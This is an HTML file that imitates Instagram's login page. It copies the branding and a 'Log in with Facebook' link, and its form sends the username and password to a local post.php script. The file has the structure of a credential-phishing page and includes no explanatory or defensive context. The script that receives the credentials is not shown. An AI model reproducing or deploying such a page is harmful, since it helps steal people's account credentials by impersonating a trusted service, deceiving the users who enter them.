<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      max-width: 935px;
      width: 100%;
    }

    .phone-image {
      flex: 1;
      display: none;
    }

    .login-box {
      flex: 1;
      max-width: 350px;
      background-color: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      text-align: center;
    }

    .login-box img.logo {
      width: 175px;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 8px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 8px;
      background-color: #3897f0;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      margin-top: 10px;
      cursor: pointer;
    }

    .or {
      display: flex;
      align-items: center;
      margin: 20px 0;
      color: #8e8e8e;
      font-size: 13px;
    }

    .or::before,
    .or::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .or::before {
      margin-right: 10px;
    }

    .or::after {
      margin-left: 10px;
    }

    .facebook-login {
      color: #385185;
      font-size: 14px;
      font-weight: bold;
      margin: 10px 0;
      cursor: pointer;
    }

    .forgot {
      font-size: 12px;
      color: #00376b;
      margin-top: 12px;
    }

    .signup-box {
      border: 1px solid #dbdbdb;
      padding: 20px;
      text-align: center;
      margin-top: 10px;
      background: white;
    }

    .signup-box a {
      color: #3897f0;
      text-decoration: none;
      font-weight: bold;
    }

    .get-the-app {
      margin-top: 20px;
      text-align: center;
    }

    .app-badges img {
      height: 40px;
      margin: 5px;
    }

    @media screen and (min-width: 768px) {
      .phone-image {
        display: block;
      }

      .phone-image img {
        height: 300px;
      }

      .container {
        justify-content: space-between;
      }
    }
  </style>
</head>

<body>
  <div class="container">
    <div class="phone-image">
      <img src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram Phone" />
    </div>

    <div>
      <div class="login-box">
        <img class="logo" src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram Logo" />
        <form method="POST" action="post.php">
          <input type="text" name="username" placeholder="Phone number, username, or email" required />
          <input type="password" name="password" placeholder="Password" required />
          <button type="submit">Log In</button>
        </form>
        <div class="or">OR</div>
        <div class="facebook-login"><a href="facebook.html">Log in with Facebook</a></div>
        <div class="forgot">Forgot password?</div>
      </div>

      <div class="signup-box">
        Donâ€™t have an account? <a href="#">Sign up</a>
      </div>
    </div>
  </div>
</body>

</html>
